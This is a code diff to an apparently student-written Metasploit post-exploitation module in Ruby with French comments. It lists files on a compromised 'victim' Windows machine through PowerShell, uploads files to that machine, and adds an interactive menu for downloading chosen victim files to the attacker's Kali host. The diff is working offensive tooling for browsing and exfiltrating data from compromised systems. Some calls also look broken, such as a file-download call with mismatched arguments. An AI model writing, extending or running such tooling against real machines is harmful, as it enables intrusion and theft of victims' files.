@@ -48,11 +48,10 @@ class MetasploitModule < Msf::Post
         OptPath.new('STARTING_POINT_HOST', [true, 'Starting point', '/']),
         OptString.new('STARTING_POINT_VICTIM', [true, 'Starting point', 'C:\\']),
         OptBool.new('VERBOSE', [false, 'verbose mode', false]),
-        OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', ''])
-        OptString.new('FILE_TO_DOWNLOAD', [false, 'File to download from victim machine', '']),
+        OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', '']),
         OptString.new('LOCATION_TO_SEND', [false, 'Location where file will be uploaded on victim machine', '']),
         OptPath.new('FILE_TO_UPLOAD', [false, 'file to upload on victim machine', '']),
-        OptPath.new('LOCATION_TO_RECEIVE', [false, 'location where file will be received on host machine', '']),
+        OptPath.new('LOCATION_TO_RECEIVE', [false, 'location where file will be received on host machine', ''])
       ]
     )
   end
@@ -98,7 +97,6 @@ def enumerate_files_with_extension_victim()
 
   cmd = "powershell -Command \"Get-ChildItem -Path '#{directory}' -Recurse -File -Filter '*.#{extension}' | Select-Object -ExpandProperty FullName\""
 
-  # Exécution de la commande système et récupération de la sortie
   output = session.shell_command_token(cmd)
 
   if output.nil? || output.empty? then
@@ -108,12 +106,18 @@ def enumerate_files_with_extension_victim()
   if datastore['VERBOSE'] == true then
     puts "output : "+output
   end
+
   # Parsing des résultats pour extraire les chemins des fichiers
   files = output.split("\n").map(&:strip)
+  files_fullname=files
 
   files = extract_filenames(files, /[^\/\\]+$/)
 
-  return files
+  files.each do |file|
+    puts File.expand_path(file)
+  end
+
+  return [files,files_fullname]
 end
 
 def extract_filenames(files, regex)
@@ -131,7 +135,6 @@ def compare_files_list(liste_files1, liste_files2)
   # fusion des tableaux et suppression les doublons
   res = (liste_files1 + liste_files2).uniq
   
-  # Selection les éléments qui ne sont présents qu'une seule fois
   liste_rest = res.select { 
     |item| (liste_files1.include?(item) && !liste_files2.include?(item)) || (!liste_files1.include?(item) && liste_files2.include?(item)) 
   }
@@ -159,10 +162,9 @@ def upload_file()
   end
 end
 
-def download_file()
-
-  remote_path = datastore['FILE_TO_DOWNLOAD']
-  local_path = datastore['LOCATION_TO_SEND']
+def download_file(path)
+  remote_path = path
+  local_path='/home/kali/Documents/lefichier'
 
   if remote_path.empty? || local_path.empty? then
     return
@@ -171,7 +173,7 @@ def download_file()
   print_status("Downloading #{remote_path} to #{local_path}...")
 
   begin
-    contents = session.fs.file.download_file(remote_path)
+    contents = session.fs.file.download_file(session.sid.to_s,remote_path, local_path)
     ::File.open(local_path, 'wb') { |file| file.write(contents) }
     print_good("File downloaded successfully.")
   rescue ::Exception => e
@@ -179,33 +181,63 @@ def download_file()
   end
 end
 
+  # Ecoute le prochain input et le renvoie
+  def get_input()
+    loop do
+      # Lit une seule touche du terminal sans attendre
+      input = STDIN.getch
+
+      case input.downcase
+      when "z"
+        return ""
+      when "d"
+        return SELECT_SAVE_FILE
+      when "i"
+        # inspect
+      end
+
+      # Si flèche directionnelle
+      if input == "\e" and STDIN.getch == "["
+        input = STDIN.getch
+        return input
+      end
+    end
+  end
+
   # Méthode permettant d'afficher la liste des fichiers trouvés
   def draw_menu(files)
     index=0
+    puts files
     loop do
       system('clear')
       puts "found #{files.length} files"
 
       # Pour afficher la flèche indiquant le fichier sélectionné
       selected=true
-      files[index..index+50].each do |file|
+      # On affiche 10 fichiers
+      files[index..index+10].each do |file|
         if selected
-          puts "--> #{File.expand_path(file)}"
+          puts "--> #{file}"
           selected = false
         else
-          puts File.expand_path(file)
+          puts file
         end
       end
       print "\e[999B" # Déplacer le curseur en bas de l'écran
       print "\e[999D" # Déplacer le curseur à gauche (au début de la ligne)
 
-      puts "[Z] exit"
+      print "  [Z] exit"
+      print "  [I] inspect"
+      print "  [D] download"
       choice=get_input()
       case choice
       when SELECT_UP
         index -= 1 if index > 0
       when SELECT_DOWN
         index += 1 if index < files.length-1
+      when SELECT_SAVE_FILE
+        download_file(files[index])
+        sleep(10)
       when ""
         return
       end
@@ -213,9 +245,8 @@ end
   end
 
 def run
-    
+
   upload_file
-  download_file
 
     if datastore['FILE_NAME'] != '' then 
       find_single_file_on_victim_post()
@@ -223,11 +254,12 @@ def run
     end
 
     victim_files = enumerate_files_with_extension_victim()
+
     host_files = enumerate_files_with_extension_host()
 
     if datastore['VERBOSE'] == true then
       print_good("liste des fichiers de la victime : ")
-      victim_files.each do |file|
+      victim_files[0].each do |file|
           print_status(file)
       end
 
@@ -237,10 +269,12 @@ def run
       end
     end
 
-    if compare_files_list(victim_files, host_files).empty? == true then
+
+
+    if compare_files_list(victim_files[0], host_files).empty? == true then
       print_good("aucune différences entre la victime et l'attquant au niveau des fichiers et des répertoires ciblés")
     else
-      print_error("la victime et l'attaquant ont des fichiers différents")
+      draw_menu(victim_files[1])
     end
 
   end
